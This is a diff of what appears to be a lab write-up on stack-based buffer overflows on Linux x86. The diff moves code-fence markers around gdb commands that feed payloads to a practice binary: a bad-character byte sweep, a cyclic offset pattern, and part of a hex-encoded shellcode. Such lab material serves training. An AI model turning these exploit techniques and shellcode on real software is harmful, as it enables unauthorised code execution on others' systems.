@@ -178,8 +178,8 @@ The payload will generate a string of all bytes from 0 to 255 (including) –
 meaning from /0x00 to /0xff (/0x00/0x01/0x02……/0xfe/0xff):
 ```bash
 run $(python -c 'print "\x55" * (1040 - 254 - 4) +
-```
 "".join([chr(x) for x in range(0, 256)]) + "\x66" * 4')
+```
 
 
 The execution of course, halted in the breakpoint.
@@ -330,9 +330,9 @@ gdb -q ./leave_msg
 Now, we will run the binary with the created payload:
 ```bash
 run $(python -c "print
-```
 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa....<SNIP>....Cq7Cq8Cq9Cr0Cr1Cr2C
 r3Cr4Cr5Cr6Cr7Cr8Cr9'")
+```
 *most of the payload was snipped out due to length. *
 
 ![Figure 9.1 — Lab execution and output verification (Page 9)](/assets/images/posts/htb-academy/stack-based-buffer-overflows-on-linux-x86/p009_01.jpg)
@@ -462,8 +462,8 @@ break leavemsg
 And run the bad characters payload:
 ```bash
 run $(python -c 'print "\x55" * (2060 - 256) +
-```
 "".join([chr(x) for x in range(0, 256)]) + "\x66" * 4')
+```
 
 notice in here we generate buffer of (2060-256), where 2060 is the amount of
 bytes required to get to the EIP , determined in the first question. And 256 is the
@@ -537,9 +537,9 @@ address where the buffer (the '0x55') ends and the payload starts.
 For that, we will need to run the binary with the payload in gdb:
 ```bash
 run $(python -c 'print "\x55" * (2060 - 95) +
-```
 "\xd9\xc1\xba\xca\x11\xc3\x8b\xd9\x74\x24\xf4\x58\x33\xc9\xb
 1\x12\x83\xe8\xfc\x31\x50\x13\x03\x9a\x02\x21\x7e\x2b\xfe\x5
+```
 2\x62\x18\x43\xce\x0f\x9c\xca\x11\x7f\xc6\x01\x51\x13\x5f\x2
 a\x6d\xd9\xdf\x03\xeb\x18\xb7\xec\x0b\xdb\x46\x7b\x0e\xdb\x5
 9\x27\x87\x3a\xe9\xb1\xc7\xed\x5a\x8d\xeb\x84\xbd\x3c\x6b\xc
